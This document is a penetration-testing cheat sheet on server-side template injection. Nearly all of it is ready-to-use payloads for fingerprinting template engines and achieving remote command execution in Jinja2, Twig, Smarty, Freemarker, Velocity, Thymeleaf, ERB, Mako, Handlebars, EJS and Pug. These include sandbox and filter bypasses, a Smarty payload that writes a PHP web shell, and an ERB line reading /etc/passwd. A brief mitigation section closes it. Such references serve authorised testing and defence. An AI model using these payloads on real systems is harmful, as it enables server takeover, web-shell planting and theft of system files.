# Server-Side Template Injection (SSTI)

> SSTI happens when user input is concatenated into a template that the server-side engine evaluates, allowing arbitrary expression evaluation — often leading to RCE.

## Summary

- [Identifying the Engine](#identifying-the-engine)
- [Jinja2 (Python)](#jinja2-python)
- [Twig (PHP)](#twig-php)
- [Smarty (PHP)](#smarty-php)
- [Freemarker (Java)](#freemarker-java)
- [Velocity (Java)](#velocity-java)
- [Thymeleaf (Java)](#thymeleaf-java)
- [ERB (Ruby)](#erb-ruby)
- [Mako (Python)](#mako-python)
- [Handlebars / EJS (Node)](#handlebars--ejs-node)
- [Mitigation](#mitigation)
- [References](#references)

## Identifying the Engine

Tian Tian's classic decision tree — submit each and observe:

| Payload | Result interpretation |
|---------|----------------------|
| `{{7*7}}` | `49` → Jinja2/Twig/Smarty |
| `${7*7}` | `49` → Freemarker/Velocity/Mako |
| `<%= 7*7 %>` | `49` → ERB/EJS |
| `#{7*7}` | `49` → Ruby/Pug/Thymeleaf |
| `{{7*'7'}}` | `49` → Twig; `7777777` → Jinja2 |
| `{{config}}` | object dump → Jinja2 |

Tool: [TInjA](https://github.com/Hackmanit/TInjA), [tplmap](https://github.com/epinna/tplmap) (older).

## Jinja2 (Python)

```jinja
{{7*7}}
{{config}}
{{config.items()}}
{{request}}
{{self.__dict__}}
{{''.__class__.__mro__[1].__subclasses__()}}
```

### RCE via subprocess.Popen

```jinja
{{''.__class__.__mro__[1].__subclasses__()[<idx>]('id',shell=True,stdout=-1).communicate()}}
```

Find `<idx>` for `subprocess.Popen`:

```jinja
{% for c in ''.__class__.__mro__[1].__subclasses__() %}{{loop.index0}} {{c}}{% endfor %}
```

### Shorter RCE — `lipsum`/`cycler`/`joiner`

```jinja
{{lipsum.__globals__['os'].popen('id').read()}}
{{cycler.__init__.__globals__.os.popen('id').read()}}
{{joiner.__init__.__globals__.os.popen('id').read()}}
{{namespace.__init__.__globals__.os.popen('id').read()}}
```

### Bypass sandbox (Flask)

```jinja
{{request.__class__._load_form_data.__globals__.__builtins__.eval("__import__('os').popen('id').read()")}}
{{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}
```

### Bypass when `{{` is blocked

```jinja
{% if 7*7 == 49 %}YES{% endif %}
{%print(7*7)%}
```

### Filter bypass

```
{{ request|attr("application")|attr("\x5f\x5fglobals\x5f\x5f")|attr("\x5f\x5fgetitem\x5f\x5f")("os")|attr("popen")("id")|attr("read")() }}
```

## Twig (PHP)

```twig
{{7*7}}
{{dump(app)}}
{{_self}}
{{_self.env}}
```

### RCE (Twig < 2.x)

```twig
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
{{['id']|filter('system')}}
{{['id',1]|sort('system')}}
{{['id']|map('system')|join(',')}}
```

## Smarty (PHP)

```smarty
{$smarty.version}
{php}echo `id`;{/php}                  Smarty < 3.1 / unsecured
{system('id')}
{Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php system($_GET['c']); ?>",self::clearConfig())}
```

## Freemarker (Java)

```ftl
${7*7}
${"freemarker.template.utility.Execute"?new()("id")}
<#assign ex="freemarker.template.utility.Execute"?new()> ${ex("id")}
${'.f<#assign cmd="id">${.s<#assign ex="freemarker.template.utility.Execute"?new()>${ex(cmd)}'}
```

## Velocity (Java)

```velocity
#set($s="")
#set($stringClass=$s.getClass())
#set($runtime=$stringClass.forName("java.lang.Runtime").getRuntime())
#set($process=$runtime.exec("id"))
#set($is=$process.getInputStream())
$is
```

## Thymeleaf (Java)

```html
${T(java.lang.Runtime).getRuntime().exec('id')}
*{T(java.lang.Runtime).getRuntime().exec('calc')}
__${T(java.lang.Runtime).getRuntime().exec('id')}__::.x
```

(Thymeleaf SSTI requires fragment-expression contexts — typically through unsafe view names.)

## ERB (Ruby)

```erb
<%= 7*7 %>
<%= system("id") %>
<%= `id` %>
<%= IO.popen('id').read %>
<%= File.open('/etc/passwd').read %>
```

## Mako (Python)

```mako
<%
import os
x=os.popen('id').read()
%>${x}
${self.module.cache.util.os.system("id")}
```

## Handlebars / EJS (Node)

### Handlebars (with `noEscape`)

```handlebars
{{#with "s" as |string|}}
  {{#with "e"}}
    {{#with split as |conslist|}}
      {{this.pop}}{{this.push (lookup string.sub "constructor")}}{{this.pop}}
      {{#with string.split as |codelist|}}
        {{this.pop}}
        {{this.push "return process.mainModule.require('child_process').execSync('id');"}}
        {{this.pop}}
        {{#each conslist}}
          {{#with (string.sub.apply 0 codelist)}}{{this}}{{/with}}
        {{/each}}
      {{/with}}
    {{/with}}
  {{/with}}
{{/with}}
```

### EJS

```ejs
<%= process.mainModule.require('child_process').execSync('id').toString() %>
```

### Pug (Jade)

```pug
- var x = global.process.mainModule.require('child_process').execSync('id').toString()
= x
```

## Mitigation

- **Never** render user input as a template. Pass it as a variable to a pre-defined template.
- If templating user content is unavoidable, use a **sandboxed engine** with no access to filesystem / process / class loaders.
- Keep template engines patched (Twig, Jinja2, Freemarker have had multiple sandbox escapes).

## References

- [PortSwigger — SSTI](https://portswigger.net/web-security/server-side-template-injection)
- [James Kettle — Server-Side Template Injection](https://portswigger.net/research/server-side-template-injection)
- [HackTricks — SSTI](https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection)
